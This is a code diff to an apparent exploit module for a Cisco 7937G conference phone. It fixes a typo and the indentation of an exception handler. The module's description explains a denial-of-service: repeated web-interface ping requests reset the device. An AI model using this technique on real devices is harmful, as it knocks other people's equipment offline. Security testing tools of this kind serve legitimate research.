@@ -27,7 +27,7 @@ metadata = {
     'name': 'Cisco 7937G Denial-of-Service Reboot Attack',
     'description': '''
 	This module exploits a bug in how the conference station handles 
-	executing a ping via it's web interface. By repeatedly executing 
+	executing a ping via its web interface. By repeatedly executing 
 	the ping function without clearing out the resulting output, 
 	a DoS is caused that will reset the device after a few minutes.
     ''',
@@ -79,10 +79,10 @@ def run(args):
         except requests.exceptions.ReadTimeout as e:
             logging.info('DoS reset attack completed!')
             return
-	except requests.exceptions.RequestException as e:
-	    logging.info('An unexpected exception occurred: ' + str(e))
-	    logging.info('The device may be DoS\'d already or not have web access enabled.')
-	    return
+        except requests.exceptions.RequestException as e:
+            logging.info('An unexpected exception occurred: ' + str(e))
+            logging.info('The device may be DoS\'d already or not have web access enabled.')
+            return
 
 
 if __name__ == '__main__':
